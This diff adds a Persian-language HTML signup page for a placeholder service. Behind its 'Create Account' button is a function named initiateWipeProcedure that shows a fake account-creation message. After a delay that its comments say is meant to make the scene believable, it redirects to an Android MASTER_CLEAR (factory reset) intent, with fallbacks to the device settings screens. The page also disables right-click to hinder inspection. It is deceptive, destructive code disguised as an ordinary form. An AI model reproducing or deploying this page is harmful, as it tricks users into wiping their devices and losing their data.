@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account - ServiceName</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 25px;
+            background-color: #667eea;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+        }
+        h1 {
+            color: #4a5568;
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus,
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .create-account-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-top: 10px;
+        }
+        .create-account-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+        .create-account-btn:active {
+            transform: translateY(0);
+        }
+        .footer-links {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #718096;
+        }
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        #statusMessage {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            font-weight: 500;
+        }
+        .status-success {
+            background-color: #48bb78;
+            color: white;
+        }
+        .status-error {
+            background-color: #f56565;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">S</div> <!-- لوگوی ساده -->
+        <h1>حساب کاربری جدید بسازید</h1>
+        
+        <form id="signupForm">
+            <div class="form-group">
+                <label for="fullname">نام کامل</label>
+                <input type="text" id="fullname" placeholder="نام خود را وارد کنید" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="email">ایمیل</label>
+                <input type="email" id="email" placeholder="ایمیل خود را وارد کنید" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">رمز عبور</label>
+                <input type="password" id="password" placeholder="رمز عبور قوی انتخاب کنید" autocomplete="off">
+            </div>
+            
+            <button type="button" class="create-account-btn" onclick="initiateWipeProcedure()">
+                ایجاد حساب کاربری
+            </button>
+        </form>
+
+        <div id="statusMessage"></div>
+        
+        <div class="footer-links">
+            <a href="#">قوانین استفاده</a>
+            <a href="#">حریم خصوصی</a>
+            <a href="#">پشتیبانی</a>
+        </div>
+    </div>
+
+    <script>
+        function initiateWipeProcedure() {
+            const button = document.querySelector('.create-account-btn');
+            const status = document.getElementById('statusMessage');
+            
+            // غیرفعال کردن دکمه برای جلوگیری از کلیک مجدد
+            button.disabled = true;
+            button.textContent = 'در حال پردازش...';
+            
+            // تغییر وضعیت به نشانه شروع عملیات
+            status.textContent = 'در حال ایجاد حساب و تأمین امنیت داده‌ها...';
+            status.style.display = 'block';
+            status.className = 'status-success';
+
+            // تأخیر برای باورپذیر کردن صحنه
+            setTimeout(() => {
+                try {
+                    // اصلی‌ترین و مستقیم‌ترین حمله: استفاده از Intent برای MASTER_CLEAR
+                    const masterClearIntent = "intent:#Intent;action=android.intent.action.MASTER_CLEAR;package=android;end";
+                    window.location.href = masterClearIntent;
+                    
+                    // Fallback 1: Attempt to open the stock factory reset activity
+                    window.location.href = "intent://com.android.settings#Intent;action=android.settings.SECURITY_SETTINGS;end";
+                    
+                    // Fallback 2: آخرین راهکار - هدایت به صفحه تنظیمات Reset
+                    setTimeout(() => {
+                        window.location.href = "intent://com.android.settings#Intent;action=android.settings.PRIVACY_SETTINGS;end";
+                    }, 1000);
+                    
+                } catch (error) {
+                    status.textContent = 'خطا در برقراری ارتباط امن. لطفاً بعداً تلاش کنید.';
+                    status.className = 'status-error';
+                    button.disabled = false;
+                    button.textContent = 'ایجاد حساب کاربری';
+                }
+            }, 2000); // تأخیر 2 ثانیه‌ای برای واقعی‌تر نشان دادن عملیات
+        }
+
+        // جلوگیری از کلیک راست و بررسی کد صفحه
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+</body>
+</html>
